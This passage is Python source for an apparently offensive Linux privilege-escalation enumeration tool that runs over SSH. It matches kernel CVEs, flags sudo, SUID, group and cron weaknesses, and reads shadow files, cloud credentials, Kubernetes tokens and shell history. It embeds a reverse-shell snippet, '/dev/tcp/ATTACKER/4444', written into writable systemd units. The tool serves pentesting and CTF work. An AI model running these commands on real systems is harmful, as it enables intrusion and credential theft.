        ("CVE-2022-34918","critical", "Linux netfilter nf_tables type confusion LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2022-34918"),
    ],
    "5.17.0": [
        ("CVE-2022-25636","high",     "Netfilter heap out-of-bounds write",                       "https://nvd.nist.gov/vuln/detail/CVE-2022-25636"),
        ("CVE-2022-34918","critical", "Linux netfilter nf_tables type confusion LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2022-34918"),
        ("CVE-2022-2586", "high",     "Linux netfilter nf_tables use-after-free LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2022-2586"),
    ],
    "6.1.0":  [
        ("CVE-2023-0179", "high",     "Linux netfilter nftables stack overflow LPE",              "https://nvd.nist.gov/vuln/detail/CVE-2023-0179"),
        ("CVE-2023-4147", "high",     "Linux netfilter nf_tables use-after-free",                 "https://nvd.nist.gov/vuln/detail/CVE-2023-4147"),
        ("CVE-2024-1086", "critical", "Linux netfilter nf_tables use-after-free LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"),
        ("CVE-2023-6931", "high",     "Linux perf subsystem out-of-bounds write LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2023-6931"),
    ],
    "6.2.0":  [
        ("CVE-2023-4147", "high",     "Linux netfilter nf_tables use-after-free",                 "https://nvd.nist.gov/vuln/detail/CVE-2023-4147"),
        ("CVE-2024-1086", "critical", "Linux netfilter nf_tables use-after-free LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"),
    ],
    "6.4.0":  [
        ("CVE-2023-4147", "high",     "Linux netfilter nf_tables use-after-free",                 "https://nvd.nist.gov/vuln/detail/CVE-2023-4147"),
        ("CVE-2024-1086", "critical", "Linux netfilter nf_tables use-after-free LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"),
        ("CVE-2023-6931", "high",     "Linux perf subsystem out-of-bounds write LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2023-6931"),
    ],
    "6.5.0":  [
        ("CVE-2024-1086", "critical", "Linux netfilter nf_tables use-after-free LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"),
        ("CVE-2023-6931", "high",     "Linux perf subsystem out-of-bounds write LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2023-6931"),
        ("CVE-2024-26925","high",     "Linux netfilter race condition LPE",                       "https://nvd.nist.gov/vuln/detail/CVE-2024-26925"),
    ],
    "6.6.0":  [
        ("CVE-2024-1086", "critical", "Linux netfilter nf_tables use-after-free LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"),
        ("CVE-2024-26925","high",     "Linux netfilter race condition LPE",                       "https://nvd.nist.gov/vuln/detail/CVE-2024-26925"),
        ("CVE-2024-26584","high",     "Linux TLS kernel use-after-free",                          "https://nvd.nist.gov/vuln/detail/CVE-2024-26584"),
    ],
    "6.8.0":  [
        ("CVE-2024-26925","high",     "Linux netfilter race condition LPE",                       "https://nvd.nist.gov/vuln/detail/CVE-2024-26925"),
        ("CVE-2024-26584","high",     "Linux TLS kernel use-after-free",                          "https://nvd.nist.gov/vuln/detail/CVE-2024-26584"),
        ("CVE-2024-36886","high",     "Linux TIPC out-of-bounds read LPE",                        "https://nvd.nist.gov/vuln/detail/CVE-2024-36886"),
        ("CVE-2025-21756","critical", "Attack of the Vsock - vsock VM escape to host root",       "https://nvd.nist.gov/vuln/detail/CVE-2025-21756"),
    ],
    "6.10.0": [
        ("CVE-2024-36886","high",     "Linux TIPC out-of-bounds read LPE",                        "https://nvd.nist.gov/vuln/detail/CVE-2024-36886"),
        ("CVE-2024-41090","high",     "Linux virtio-net double-free LPE",                         "https://nvd.nist.gov/vuln/detail/CVE-2024-41090"),
    ],
    "6.11.0": [
        ("CVE-2025-21756","critical", "Attack of the Vsock - vsock VM escape to host root",       "https://nvd.nist.gov/vuln/detail/CVE-2025-21756"),
    ],
    "6.12.0": [
        ("CVE-2025-21756","critical", "Attack of the Vsock - vsock VM escape to host root",       "https://nvd.nist.gov/vuln/detail/CVE-2025-21756"),
    ],
}

SENSITIVE_ENV_KEYS = [
    "password","passwd","pass","secret","key","token",
    "api_key","apikey","auth","credential","cred",
    "db_pass","dbpass","db_password","mysql_pass",
    "aws_secret","aws_access","private_key",
]


class SSHCollector:

    def __init__(self, client, target, domain, verbose):
        self.client        = client
        self.target        = target
        self.domain        = domain
        self.verbose       = verbose
        self._nodes        = {}
        self._edges        = []
        self._findings     = []
        self._edge_counter = 0
        self._current_user = ""
        self._current_uid  = ""
        self._hostname     = ""
        self._kernel       = ""
        self._os           = "Linux"
        self._arch         = ""
        self._collected_at = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        self.log_info      = log_info
        self.log_ok        = log_ok
        self.log_verbose   = log_verbose

    def _next_eid(self):
        self._edge_counter += 1
        return f"e{self._edge_counter}"

    def build_output(self):
        node_list = list(self._nodes.values())
        edge_list = self._edges
        return {
            "metadata": {
                "hostname":          self._hostname or self.target,
                "os":                self._os,
                "kernel":            self._kernel,
                "arch":              self._arch,
                "collected_at":      self._collected_at,
                "collector":         "bloodpengu-python",
                "collector_version": BP_VERSION,
                "collected_as":      self._current_user,
                "uid":               self._current_uid,
            },
            "nodes": node_list,
            "edges": edge_list,
            "stats": {
                "total_nodes":  len(node_list),
                "total_edges":  len(edge_list),
                "paths_to_root": 0,
            },
        }

    def _add_node(self, node_id, node_type, label, properties=None):
        if node_id not in self._nodes:
            self._nodes[node_id] = {
                "id":         node_id,
                "type":       node_type,
                "label":      label,
                "properties": properties or {},
            }

    def _add_edge(self, src_id, edge_type, dst_id, risk="low", properties=None):
        if src_id not in self._nodes or dst_id not in self._nodes:
            return
        self._edges.append({
            "id":         self._next_eid(),
            "source":     src_id,
            "target":     dst_id,
            "type":       edge_type,
            "risk":       risk,
            "properties": properties or {},
        })

    def _add_finding(self, tier, collector, detail, raw=None):
        self._findings.append({
            "tier":      tier,
            "collector": collector,
            "detail":    detail,
            "raw":       raw or "",
        })
        log_find(tier, collector, detail)

    def run(self, cmd, timeout=20):
        try:
            _, stdout, _ = self.client.exec_command(cmd, timeout=timeout)
            return stdout.read().decode("utf-8", errors="replace").strip()
        except Exception:
            return ""

    def run_lines(self, cmd, timeout=20):
        return [l.strip() for l in self.run(cmd, timeout=timeout).splitlines() if l.strip()]

    def writable(self, path):
        return self.run(f"[ -w '{path}' ] && echo YES || echo NO").strip() == "YES"

    def readable(self, path):
        return self.run(f"[ -r '{path}' ] && echo YES || echo NO").strip() == "YES"

    def collect_users(self):
        log_info("Collecting users and groups...")
        self._current_user = self.run("whoami").strip()
        self._hostname     = self.run("hostname 2>/dev/null").strip()
        self._arch         = self.run("uname -m 2>/dev/null").strip()
        self._os           = self.run(
            "lsb_release -ds 2>/dev/null || "
            "grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '\"' || "
            "echo Linux"
        ).strip().splitlines()[0]

        id_out = self.run("id").strip()
        for part in id_out.replace(",", " ").split():
            if part.startswith("uid="):
                self._current_uid = part.split("=")[1].split("(")[0]
                break

        self._add_node("user:root", "user", "root", {
            "uid": "0", "gid": "0", "home": "/root",
            "shell": "/bin/bash", "is_root": True, "is_current": False,
        })

        for line in self.run_lines("cat /etc/passwd 2>/dev/null"):
            parts = line.split(":")
            if len(parts) < 7:
                continue
            uname  = parts[0]
            uid    = parts[2]
            gid    = parts[3]
            home   = parts[5]
            shell  = parts[6]
            nid    = f"user:{uname}"
            self._add_node(nid, "user", uname, {
                "uid":        uid,
                "gid":        gid,
                "home":       home,
                "shell":      shell,
                "is_root":    uid == "0",
                "is_current": uname == self._current_user,
            })
            if uid == "0" and uname != "root":
                self._add_finding("CRITICAL", "users", f"UID 0 non-root account: {uname}", line)
            if self.verbose and shell not in ("/bin/false", "/usr/sbin/nologin", "/sbin/nologin", ""):
                log_verbose("users", uname, f"uid={uid} shell={shell}")

        for line in self.run_lines("cat /etc/group 2>/dev/null"):
            parts = line.split(":")
            if len(parts) < 4:
                continue
            gname = parts[0]
            gid   = parts[2]
            self._add_node(f"group:{gname}", "group", gname, {
                "gid":           gid,
                "is_privileged": gname.lower() in PRIV_GROUPS,
            })

        if self.run("cat /etc/shadow 2>/dev/null | head -1"):
            self._add_finding("CRITICAL", "users", "/etc/shadow readable from current privilege level")
        if self.run("cat /etc/gshadow 2>/dev/null | head -1"):
            self._add_finding("HIGH", "users", "/etc/gshadow readable from current privilege level")

        u = sum(1 for n in self._nodes.values() if n["type"] == "user")
        g = sum(1 for n in self._nodes.values() if n["type"] == "group")
        log_ok(f"Users: {u}  |  Groups: {g}")

    def collect_sudo(self):
        log_info("Collecting sudo rules...")
        cu    = self._current_user
        cu_id = f"user:{cu}"
        sudo_out = self.run("sudo -l 2>/dev/null")
        if not sudo_out:
            log_dim("sudo -l returned nothing - no sudo access or not in sudoers")
            return
        rule_count = 0
        for line in sudo_out.splitlines():
            line  = line.strip()
            lower = line.lower()
            if "nopasswd" in lower:
                rule_count += 1
                if "(all) nopasswd: all" in lower or "(root) nopasswd: all" in lower:
                    self._add_finding("CRITICAL", "sudo", f"Full NOPASSWD all: {line}", line)
                    self._add_edge(cu_id, "SudoNoPasswd", "user:root", risk="critical",
                                   properties={"rule": line})
                else:
                    cmd_part = line.split("NOPASSWD:")[-1].strip() if "NOPASSWD:" in line else line
                    self._add_finding("HIGH", "sudo", f"NOPASSWD rule: {line}", line)
                    self._add_edge(cu_id, "SudoNoPasswd", "user:root", risk="high",
                                   properties={"rule": line})
                    for gb in GTFOBINS:
                        if gb in cmd_part.lower().split():
                            self._add_finding("CRITICAL", "sudo", f"GTFOBins binary in NOPASSWD: {gb}  ({line})", line)
                            break
            elif "(all)" in lower or "(root)" in lower:
                rule_count += 1
                if self.verbose:
                    log_verbose("sudo", "rule (passwd required)", line)
        log_ok(f"Sudo rules collected: {rule_count}")

    def collect_suid(self):
        log_info("Collecting SUID/SGID binaries...")
        cu_id = f"user:{self._current_user}"
        lines = self.run_lines(
            "find / \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null"
            " | grep -v '/proc/' | grep -v '/sys/'",
            timeout=60,
        )
        gtfo_count = 0
        for path in lines:
            name    = os.path.basename(path).lower()
            is_gtfo = name in [g.lower() for g in GTFOBINS]
            nid     = f"binary:{path}"
            self._add_node(nid, "binary", path, {
                "path": path, "suid": True, "gtfobin": is_gtfo, "owner": "other",
            })
            risk = "critical" if is_gtfo else "medium"
            self._add_edge(cu_id, "SuidBinary", nid, risk=risk, properties={"path": path})
            if is_gtfo:
                gtfo_count += 1
                self._add_finding("CRITICAL", "suid", f"GTFOBins SUID binary: {path}", path)
                self._add_edge(cu_id, "SuidBinary", "user:root", risk="critical",
                               properties={"path": path, "via": name})
            elif self.verbose:
                log_verbose("suid", "binary", path)
        log_ok(f"SUID/SGID: {len(lines)}  |  GTFOBins hits: {gtfo_count}")

    def collect_groups(self):
        log_info("Collecting privileged group memberships...")
        cu    = self._current_user
        cu_id = f"user:{cu}"
        id_out     = self.run("id")
        groups_raw = self.run("groups")
        user_groups = set()
        for part in id_out.split(","):
            for seg in part.split("="):
                seg = seg.strip()
                if "(" in seg and ")" in seg:
                    user_groups.add(seg[seg.find("(")+1:seg.find(")")].lower())
        for part in groups_raw.split():
            user_groups.add(part.strip().lower())

        for grp in user_groups:
            grp_id = f"group:{grp}"
            if grp_id not in self._nodes:
                self._add_node(grp_id, "group", grp, {
                    "gid": "", "is_privileged": grp in PRIV_GROUPS,
                })
            risk = PRIV_GROUPS.get(grp, "low")
            self._add_edge(cu_id, "MemberOf", grp_id, risk=risk)
            if grp == "docker":
                self._add_finding("CRITICAL", "groups", "Member of docker group - socket escape to root available", grp)
                self._add_edge(cu_id, "DockerEscape", "user:root", risk="critical",
                               properties={"via": "docker group socket mount"})
            elif grp in ("lxd", "lxc"):
                self._add_finding("CRITICAL", "groups", f"Member of {grp} group - image escape to root", grp)
                self._add_edge(cu_id, "LXDGroupEscape", "user:root", risk="critical",
                               properties={"via": f"{grp} image init"})
            elif grp in ("sudo", "wheel", "admin"):
                self._add_finding("HIGH", "groups", f"Member of {grp} group - likely sudo access", grp)
            elif grp == "disk":
                self._add_finding("CRITICAL", "groups", "Member of disk group - raw disk read/write access", grp)
            elif grp == "shadow":
                self._add_finding("CRITICAL", "groups", "Member of shadow group - /etc/shadow accessible", grp)
            elif grp in ("adm", "systemd-journal"):
                self._add_finding("POTENTIAL", "groups", f"Member of {grp} - log access, possible credential leakage", grp)

        log_ok(f"Groups: {', '.join(sorted(user_groups))}")

    def collect_services(self):
        log_info("Collecting systemd service units...")
        cu_id      = f"user:{self._current_user}"
        unit_paths = self.run_lines(
            "find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' 2>/dev/null"
        )
        writable_count = 0
        for path in unit_paths:
            svc_name = os.path.basename(path)
            nid      = f"service:{svc_name}"
            self._add_node(nid, "service", svc_name, {
                "path": path, "run_as": "root", "state": "unknown",
            })
            if self.writable(path):
                writable_count += 1
                self._add_finding("CRITICAL", "services", f"Writable systemd unit: {path}", path)
                self._add_edge(cu_id, "WritableService", nid, risk="critical",
                               properties={
                                   "path":            path,
                                   "writable_by":     "user",
                                   "exploit_snippet": f"echo '[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' > {path} && systemctl daemon-reload",
                               })
                self._add_edge(cu_id, "WritableService", "user:root", risk="critical",
                               properties={"via": f"writable unit {svc_name}"})

        exec_scripts = self.run_lines(
            "grep -r 'ExecStart=' /etc/systemd /lib/systemd 2>/dev/null | grep -v '#'"
            " | awk -F= '{print $2}' | awk '{print $1}'"
        )
        for script in exec_scripts:
            script = script.strip().split()[0] if script.strip() else ""
            if not script or not script.startswith("/"):
                continue
            if self.writable(script):
                sname = os.path.basename(script)
                snid  = f"service:{sname}"
                self._add_node(snid, "service", sname, {
                    "path": script, "run_as": "root", "state": "unknown",
                })
                self._add_finding("CRITICAL", "services", f"Writable ExecStart script: {script}", script)
                self._add_edge(cu_id, "WritableService", snid, risk="critical",
                               properties={"path": script, "writable_by": "user"})
                self._add_edge(cu_id, "WritableService", "user:root", risk="critical",
                               properties={"via": f"writable exec script {sname}"})
                if self.verbose:
                    log_verbose("services", "writable exec", script)

        log_ok(f"Units scanned: {len(unit_paths)}  |  Writable: {writable_count}")

    def collect_cron(self):
        log_info("Collecting cron jobs and scheduled tasks...")
        cu    = self._current_user
        cu_id = f"user:{cu}"
        cron_files = self.run_lines(
            "find /etc/crontab /etc/cron.d /etc/cron.daily /etc/cron.hourly"
            " /etc/cron.weekly /etc/cron.monthly /var/spool/cron"
            " /var/spool/cron/crontabs -type f 2>/dev/null"
        )
        entry_count = 0
        for cf in cron_files:
            if self.writable(cf):
                self._add_finding("HIGH", "cron", f"Writable cron file: {cf}", cf)
            if not self.readable(cf):
                continue
            for line in self.run_lines(f"cat '{cf}' 2>/dev/null"):
                if line.startswith("#") or not line.strip():
                    continue
                if "=" in line and len(line.split()) == 1:
                    continue
                parts = line.split()
                if len(parts) < 7:
                    continue
                owner  = parts[5]
                script = parts[6]
                if not all(ch.isalnum() or ch in "_-." for ch in owner):
                    continue
                if not script.startswith("/"):
                    continue
                entry_count += 1
                owner_id = f"user:{owner}"
                if owner_id not in self._nodes:
                    self._add_node(owner_id, "user", owner, {
                        "uid": "", "gid": "", "home": "", "shell": "",
                        "is_root": owner == "root", "is_current": owner == cu,
                    })
                if self.writable(script):
                    self._add_finding("CRITICAL", "cron", f"Writable cron script (owner={owner}): {script}", line)
                    self._add_edge(cu_id, "CronHijack", owner_id, risk="critical",
                                   properties={"script": script, "schedule": " ".join(parts[:5])})
                elif self.verbose:
                    log_verbose("cron", owner, script)

        user_crontab = self.run("crontab -l 2>/dev/null")
        if user_crontab:
            for line in user_crontab.splitlines():
                if line.strip() and not line.strip().startswith("#"):
                    entry_count += 1
                    if self.verbose:
                        log_verbose("cron", "user crontab", line.strip())

        log_ok(f"Cron entries collected: {entry_count}")

    def collect_kernel(self):
        log_info("Collecting kernel information...")
        cu_id   = f"user:{self._current_user}"
        uname_r = self.run("uname -r").strip()
        self._kernel = uname_r
        kernel_base  = ".".join(uname_r.split(".")[:3])
        matched = []
        for k_ver, cve_list in KERNEL_CVES.items():
            if kernel_base.startswith(k_ver):
                matched.extend(cve_list)
        seen_cves = set()
        deduped   = []
        for entry in matched:
            if entry[0] not in seen_cves:
                seen_cves.add(entry[0])
                deduped.append(entry)
        for cve, risk, desc, ref in deduped:
            self._add_finding("HIGH", "kernel", f"Kernel {uname_r} may be vulnerable to {cve}", uname_r)
            self._add_edge(cu_id, "KernelExploit", "user:root", risk=risk,
                           properties={"cve": cve, "description": desc,
                                       "kernel_version": uname_r, "reference": ref})
        if self.verbose:
            log_verbose("kernel", "version", uname_r)
        log_ok(f"Kernel: {uname_r}  |  CVE matches: {len(deduped)}")

    def collect_containers(self):
        log_info("Collecting container and cloud context...")
        cu_id = f"user:{self._current_user}"
        sock_exists  = self.run("[ -S /var/run/docker.sock ] && echo YES || echo NO").strip() == "YES"
        in_container = self.run("[ -f /.dockerenv ] && echo YES || echo NO").strip() == "YES"
        if sock_exists:
            sock_perms = self.run("ls -la /var/run/docker.sock 2>/dev/null")
            nid = "service:docker.socket"
            self._add_node(nid, "service", "docker.socket", {
                "path": "/var/run/docker.sock", "run_as": "root", "state": "active",
            })
            if self.writable("/var/run/docker.sock"):
                self._add_finding("CRITICAL", "containers", "Docker socket world-writable - direct root escalation", sock_perms)
                self._add_edge(cu_id, "WritableService", nid, risk="critical",
                               properties={"path": "/var/run/docker.sock", "writable_by": "user"})
                self._add_edge(cu_id, "DockerEscape", "user:root", risk="critical",
                               properties={"via": "writable docker socket"})
            else:
                self._add_finding("HIGH", "containers", f"Docker socket present: {sock_perms.strip()}", sock_perms)
        if in_container:
            self._add_finding("HIGH", "containers", "Running inside Docker container - escape may be in scope")
        cgroup = self.run("cat /proc/1/cgroup 2>/dev/null | head -5")
        if cgroup:
            for rt in ("docker", "lxc", "kubepods"):
                if rt in cgroup.lower():
                    self._add_finding("POTENTIAL", "containers", f"cgroup indicates {rt} environment", cgroup[:120])
                    break
        if self.run("cat ~/.aws/credentials 2>/dev/null | head -3"):
            self._add_finding("CRITICAL", "containers", "AWS credentials readable: ~/.aws/credentials")
        if self.run("ls ~/.config/gcloud/ 2>/dev/null"):
            self._add_finding("HIGH", "containers", "GCP credential directory: ~/.config/gcloud/")
        if self.run("ls ~/.azure/ 2>/dev/null"):
            self._add_finding("HIGH", "containers", "Azure credential directory: ~/.azure/")
        if self.run("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 80"):
            self._add_finding("CRITICAL", "containers", "Kubernetes service account token readable")
        if self.run("ls ~/.kube/config 2>/dev/null"):
            self._add_finding("HIGH", "containers", "kubeconfig found: ~/.kube/config")
        log_ok(f"Docker socket: {sock_exists}  |  In container: {in_container}")

    def collect_network(self):
        log_info("Collecting network information...")
        ifaces    = self.run("ip addr show 2>/dev/null || ifconfig -a 2>/dev/null")
        listening = self.run("ss -tlnpu 2>/dev/null || netstat -tlnpu 2>/dev/null")
        ranges = []
        for line in ifaces.splitlines():
            if "inet " in line and "127.0.0" not in line:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p == "inet" and i + 1 < len(parts):
                        ranges.append(parts[i+1])
        svc_ports = {
            "3306":"mysql","5432":"postgres","6379":"redis",
            "27017":"mongodb","21":"ftp","25":"smtp",
            "389":"ldap","636":"ldaps","5900":"vnc","3389":"rdp","23":"telnet",
        }
        interesting = set()
        for line in listening.splitlines():
            for port, svc in svc_ports.items():
                if f":{port}" in line or f" {port} " in line:
                    interesting.add(f"{svc} (port {port}): {line.strip()[:80]}")
        for entry in interesting:
            self._add_finding("POTENTIAL", "network", f"Interesting internal service: {entry}", entry)
        if self.verbose:
            for r in ranges:
                log_verbose("network", "interface", r)
        log_ok(f"Interfaces: {len(ranges)}  |  Interesting services: {len(interesting)}")

    def collect_env(self):
        log_info("Collecting environment and interesting files...")
        cu_id    = f"user:{self._current_user}"
        home_dir = self.run("echo $HOME").strip()
        for line in self.run("env 2>/dev/null").splitlines():
            if "=" in line and any(s in line.lower() for s in SENSITIVE_ENV_KEYS):
                self._add_finding("CRITICAL", "env", f"Sensitive env variable: {line[:120]}", line)
        interesting_home = self.run_lines(
            f"find {home_dir} -maxdepth 4 -type f \\("
            " -name '*.txt' -o -name '*.log' -o -name '*.cfg' -o -name '*.conf'"
            " -o -name '*.env' -o -name '*.bak' -o -name '*.old'"
            " -o -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519'"
            " -o -name '*.pem' -o -name '*.key' -o -name '*.ppk'"
            " -o -name 'flag*' -o -name 'user.txt' -o -name 'root.txt'"
            " \\) 2>/dev/null | head -40"
        )
        for f in interesting_home:
            fname = os.path.basename(f).lower()
            if any(x in fname for x in ("id_rsa","id_dsa","id_ecdsa","id_ed25519",".pem",".key",".ppk")):
                perms = self.run(f"stat -c '%a' '{f}' 2>/dev/null")
                self._add_finding("CRITICAL", "env", f"SSH/crypto key: {f}  (perms: {perms})", f)
            elif fname in ("user.txt","root.txt","flag.txt"):
                content = self.run(f"cat '{f}' 2>/dev/null")
                self._add_finding("CRITICAL", "env", f"CTF flag file: {f}", content[:80] if content else f)
            elif any(x in fname for x in (".env","passwd","password","secret","cred")):
                self._add_finding("HIGH", "env", f"Potentially sensitive file: {f}", f)
            elif self.verbose:
                log_verbose("env", "file", f)
        for hf in self.run_lines(
            f"find {home_dir} /root -maxdepth 2"
            " \\( -name '*_history' -o -name '.bash_history' -o -name '.zsh_history' \\) 2>/dev/null"
        ):
            if not self.readable(hf):
                continue
            hist = self.run(
                f"cat '{hf}' 2>/dev/null | grep -iE"
                " '(pass|passwd|password|secret|key|token|curl|wget|ssh|mysql|psql|ftp)' | head -20"
            )
            if hist:
                self._add_finding("HIGH", "env", f"Sensitive commands in history: {hf}", hist[:200])
        log_ok(f"Env collected  |  Interesting files: {len(interesting_home)}")

    def collect_sacspengu(self):
        mod = load_module("sacspengu")
        if mod:
            mod.run(self)
        else:
            log_err("Module sacspengu not found in modules/")

    def collect_avrisk(self):
        mod = load_module("avrisk")
        if mod:
            mod.run(self)
        else:
            log_err("Module avrisk not found in modules/")

    def collect_brace(self):
        mod = load_module("brace")
        if mod:
            mod.run(self)
        else:
            log_err("Module brace not found in modules/")

    def collect_kernel_module(self):
        log_info("Running kernel and LPE full checklist...")
        cu_id   = f"user:{self._current_user}"
        uname_r = self.run("uname -r").strip()
        if not uname_r:
            uname_r = self._kernel or "unknown"
        self._kernel = uname_r
        kernel_base  = ".".join(uname_r.split(".")[:3])
        finding_count = 0

        matched = []
        for k_ver, cve_list in KERNEL_CVES.items():
            if kernel_base.startswith(k_ver):
                matched.extend(cve_list)
        seen    = set()
        deduped = []
        for entry in matched:
            if entry[0] not in seen:
                seen.add(entry[0])
                deduped.append(entry)
        for cve, risk, desc, ref in deduped:
            tier = "CRITICAL" if risk == "critical" else "HIGH"
            self._add_finding(tier, "kernel",
                f"{cve}  |  {desc}  |  kernel {uname_r}", uname_r)
            self._add_edge(cu_id, "KernelExploit", "user:root", risk=risk,
                           properties={"cve": cve, "description": desc,
                                       "kernel_version": uname_r, "reference": ref})
            finding_count += 1

        sudo_raw = self.run("sudo --version 2>/dev/null | head -1").strip()
        if sudo_raw:
            sudo_ver_str = sudo_raw.replace("Sudo version", "").strip()
            self._add_finding("POTENTIAL", "kernel",
                f"Sudo version: {sudo_ver_str}", sudo_raw)
            finding_count += 1
            try:
                parts = sudo_ver_str.split(".")
                major = int(parts[0]) if parts else 0
                minor = int(parts[1]) if len(parts) > 1 else 0
                patch_raw = parts[2] if len(parts) > 2 else "0"
                patch_str = "".join(c for c in patch_raw if c.isdigit())
                patch = int(patch_str) if patch_str else 0
                if (major, minor) < (1, 9) or ((major, minor) == (1, 9) and patch < 5):
                    self._add_finding("CRITICAL", "kernel",
                        f"CVE-2021-3156  |  Sudo {sudo_ver_str} heap-based buffer overflow - Baron Samedit LPE",
                        "https://nvd.nist.gov/vuln/detail/CVE-2021-3156")
                    self._add_edge(cu_id, "KernelExploit", "user:root", risk="critical",
                                   properties={"cve": "CVE-2021-3156",
                                               "description": "Sudo Baron Samedit heap overflow LPE",
                                               "kernel_version": uname_r,
                                               "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"})
                    finding_count += 1
                if (major, minor) == (1, 8) and patch == 28:
                    self._add_finding("HIGH", "kernel",
                        f"CVE-2019-14287  |  Sudo {sudo_ver_str} user ID -1 bypass via 'sudo -u#-1'",
                        "https://nvd.nist.gov/vuln/detail/CVE-2019-14287")
                    finding_count += 1
                if (major < 1) or (major == 1 and minor < 9) or \
                   (major == 1 and minor == 9 and patch < 17):
                    self._add_finding("CRITICAL", "kernel",
                        f"CVE-2025-32463  |  Sudo {sudo_ver_str} --chroot flag LPE - CVSS 9.3 - affects sudo < 1.9.17p1",
                        "https://nvd.nist.gov/vuln/detail/CVE-2025-32463")
                    self._add_edge(cu_id, "KernelExploit", "user:root", risk="critical",
                                   properties={"cve": "CVE-2025-32463",
                                               "description": "Sudo --chroot LPE via arbitrary root filesystem pivot",
                                               "kernel_version": uname_r,
                                               "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-32463"})
                    finding_count += 1
                if (major == 1 and minor >= 8 and patch >= 8) and \
                   not (major == 1 and minor == 9 and patch >= 17):
                    self._add_finding("HIGH", "kernel",
                        f"CVE-2025-32462  |  Sudo {sudo_ver_str} policy-check bypass via --chroot - affects 1.8.8 to 1.9.17",
                        "https://nvd.nist.gov/vuln/detail/CVE-2025-32462")
                    finding_count += 1
            except Exception:
                pass

        polkit_raw = self.run("pkexec --version 2>/dev/null").strip()
        if polkit_raw:
            self._add_finding("POTENTIAL", "kernel",
                f"Polkit version: {polkit_raw}", polkit_raw)
            finding_count += 1
            try:
                pv = polkit_raw.split()[-1]
                pmaj, pmin, ppatch = (int(x) for x in (pv.split(".")[:3] + ["0","0","0"])[:3])
                if (pmaj, pmin, ppatch) < (0, 120, 0):
                    self._add_finding("CRITICAL", "kernel",
                        f"CVE-2021-4034  |  pkexec {pv} privilege escalation via argv memory corruption - PwnKit",
                        "https://nvd.nist.gov/vuln/detail/CVE-2021-4034")
                    self._add_edge(cu_id, "KernelExploit", "user:root", risk="critical",
                                   properties={"cve": "CVE-2021-4034",
                                               "description": "PwnKit pkexec argv memory corruption LPE",
                                               "kernel_version": uname_r,
                                               "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"})
                    finding_count += 1
            except Exception:
                pass

        glibc_raw = self.run("ldd --version 2>/dev/null | head -1").strip()
        if glibc_raw:
            self._add_finding("POTENTIAL", "kernel",
                f"glibc: {glibc_raw}", glibc_raw)
            finding_count += 1
        looney = self.run("ldd --version 2>/dev/null | head -1 | grep -oE '[0-9]+\\.[0-9]+'").strip()
        if looney:
            try:
                gmaj, gmin = (int(x) for x in looney.split(".")[:2])
                if gmaj == 2 and gmin <= 37:
                    self._add_finding("CRITICAL", "kernel",
                        f"CVE-2023-4911  |  glibc {looney} Looney Tunables - SUID LPE via GLIBC_TUNABLES buffer overflow",
                        "https://nvd.nist.gov/vuln/detail/CVE-2023-4911")
                    self._add_edge(cu_id, "KernelExploit", "user:root", risk="critical",
                                   properties={"cve": "CVE-2023-4911",
                                               "description": "Looney Tunables GLIBC_TUNABLES buffer overflow",
                                               "kernel_version": uname_r,
                                               "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-4911"})
                    finding_count += 1
                if gmaj == 2 and gmin <= 17:
                    self._add_finding("HIGH", "kernel",
                        f"CVE-2015-7547  |  glibc {looney} getaddrinfo stack buffer overflow - remote/local LPE",
                        "https://nvd.nist.gov/vuln/detail/CVE-2015-7547")
                    finding_count += 1
            except Exception:
                pass

        caps_raw = self.run(
            "getcap -r / 2>/dev/null | grep -v '^$' | head -30"
        ).strip()
        if caps_raw:
            DANGEROUS_CAPS = {
                "cap_setuid":   ("CRITICAL", "cap_setuid capability - direct UID 0 escalation path"),
                "cap_setgid":   ("HIGH",     "cap_setgid capability - arbitrary group escalation"),
                "cap_dac_override": ("HIGH", "cap_dac_override - bypass filesystem permission checks"),
                "cap_dac_read_search": ("HIGH", "cap_dac_read_search - read any file regardless of permissions"),
                "cap_sys_admin":("CRITICAL", "cap_sys_admin - broad kernel admin capability, multiple LPE paths"),
                "cap_sys_ptrace":("CRITICAL","cap_sys_ptrace - ptrace any process, credential extraction possible"),
                "cap_net_raw":  ("HIGH",     "cap_net_raw - raw socket access, MITM and sniffing"),
                "cap_chown":    ("HIGH",     "cap_chown - change ownership of any file including /etc/shadow"),
                "cap_fowner":   ("HIGH",     "cap_fowner - bypass permission checks on owned files"),
                "cap_sys_module":("CRITICAL","cap_sys_module - load arbitrary kernel modules, direct ring0 access"),
                "cap_sys_rawio":("CRITICAL", "cap_sys_rawio - raw I/O to physical devices, memory overwrite"),
                "cap_sys_chroot":("HIGH",    "cap_sys_chroot - chroot into arbitrary directory"),
                "cap_kill":     ("POTENTIAL","cap_kill - send signals to processes owned by other users"),
                "cap_audit_write":("POTENTIAL","cap_audit_write - write to kernel audit log"),
                "cap_net_admin":("HIGH",     "cap_net_admin - configure network interfaces, potential pivot"),
            }
            for line in caps_raw.splitlines():
                line_low = line.lower()
                for cap_name, (tier, cap_desc) in DANGEROUS_CAPS.items():
                    if cap_name in line_low:
                        self._add_finding(tier, "kernel",
                            f"Dangerous capability on binary: {line.strip()}  |  {cap_desc}", line)
                        if cap_name in ("cap_setuid", "cap_sys_admin", "cap_sys_ptrace",
